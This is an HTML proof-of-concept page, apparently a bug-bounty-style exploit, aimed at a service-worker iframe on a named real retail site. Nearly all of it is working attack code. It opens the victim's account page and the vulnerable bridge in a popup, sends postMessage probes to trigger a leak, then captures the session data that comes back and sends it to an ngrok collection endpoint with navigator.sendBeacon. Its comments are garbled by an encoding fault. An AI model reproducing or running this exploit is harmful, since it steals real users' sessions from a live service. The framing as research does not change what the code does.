<!DOCTYPE html>
<html>
<head>
    <title>Security Research - Session Analysis</title>
</head>
<body style="background:#0a0a0a; color:#00ff41; font-family: 'Courier New', monospace; padding:30px;">
    <h2 style="border-bottom: 2px solid #00ff41; padding-bottom: 10px;">ğŸ›¡ï¸ Vulnerability Research: Zooplus Bridge</h2>
    
    <div style="background:#111; border:1px solid #333; padding:20px; border-radius:5px;">
        <p>[!] Target: stm.zooplus.com / sw_iframe.html</p>
        <p>[!] Vulnerability: Insecure Origin Reflection & Cross-Tab Leak</p>
        <button id="startAttack" style="padding:15px 30px; background:#00ff41; color:#000; border:none; font-weight:bold; cursor:pointer; border-radius:3px;">
            EXECUTE SESSION CAPTURE
        </button>
    </div>

    <div id="statusBox" style="margin-top:20px; color: yellow;">Status: Waiting for interaction...</div>
    
    <div id="logs" style="margin-top:20px; border:1px solid #00ff41; padding:15px; background:#000; height: 300px; overflow-y: scroll; font-size: 13px;">
        > Initialized console...<br>
    </div>

    <script>
        const logs = document.getElementById('logs');
        const statusBox = document.getElementById('statusBox');
        
        function log(msg, color = "#00ff41") {
            const time = new Date().toLocaleTimeString();
            logs.innerHTML += `<span style="color:${color}">[${time}] > ${msg}</span><br>`;
            logs.scrollTop = logs.scrollHeight;
            console.log(msg);
        }

        document.getElementById('startAttack').onclick = function() {
            log("ğŸš€ Phase 1: Opening Legitimate Session Tab...", "#3498db");
            statusBox.innerText = "Status: Synchronizing Session...";

            // 1. ÙØªØ­ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø£ØµÙ„ÙŠ Ù„ØªÙ†Ø´ÙŠØ· Ø§Ù„ÙƒÙˆÙƒÙŠØ² ÙˆØ§Ù„Ù€ Service Worker
            const victimTab = window.open("https://www.zooplus.com/account/overview", "zooplus_main");

            // 2. Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø«Ù… ÙØªØ­ Ø§Ù„Ø¬Ø³Ø± Ø§Ù„Ù…ØµØ§Ø¨
            setTimeout(() => {
                log("ğŸš€ Phase 2: Launching Vulnerable Bridge Popup...", "#3498db");
                
                const targetUrl = "https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=" 
                                  + encodeURIComponent(window.location.origin) 
                                  + "&1p=1";
                
                // ÙØªØ­ Ø§Ù„Ø¬Ø³Ø± ÙÙŠ Ù†Ø§ÙØ°Ø© Ù…Ø®ÙÙŠØ© Ø£Ùˆ ØµØºÙŠØ±Ø©
                const bridgePopup = window.open(targetUrl, "zooplus_bridge", "width=200,height=200,left=1000,top=1000");

                // 3. Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø±Ø¨Ø©
                window.addEventListener("message", function(event) {
                    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù…Ù† Zooplus
                    if (event.origin.includes("zooplus.com")) {
                        log("ğŸ”“ CRITICAL DATA CAPTURED!", "red");
                        log("Source Origin: " + event.origin);
                        log("Payload: " + JSON.stringify(event.data), "yellow");

                        statusBox.innerText = "Status: DATA EXFILTRATED!";
                        statusBox.style.color = "red";

                        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙˆØ±Ø§Ù‹ Ù„Ø³ÙŠØ±ÙØ±Ùƒ (Ngrok) Ù„ØªÙˆØ«ÙŠÙ‚ Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚
                        navigator.sendBeacon("https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/collect", JSON.stringify({
                            type: "Full_Session_Exfiltration",
                            data: event.data,
                            timestamp: new Date().toISOString()
                        }));
                    }
                }, false);

                // 4. Ø¥Ø±Ø³Ø§Ù„ Ù…Ø­ÙØ²Ø§Øª (Triggers) Ù„Ù„Ø¬Ø³Ø±
                setTimeout(() => {
                    log("Step 3: Sending Probes to trigger the Service Worker relay...");
                    const triggerEvents = [
                        { type: "AUTH-SUCCESS-EVENT-v1" },
                        { type: "GET_SESSION_INFO" },
                        "ping"
                    ];
                    
                    triggerEvents.forEach(evt => {
                        bridgePopup.postMessage(evt, "https://stm.zooplus.com");
                    });
                }, 3000);

            }, 2500); // ØªØ£Ø®ÙŠØ± Ù„Ø¶Ù…Ø§Ù† ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© Ø£ÙˆÙ„Ø§Ù‹
        };
    </script>
</body>
</html>
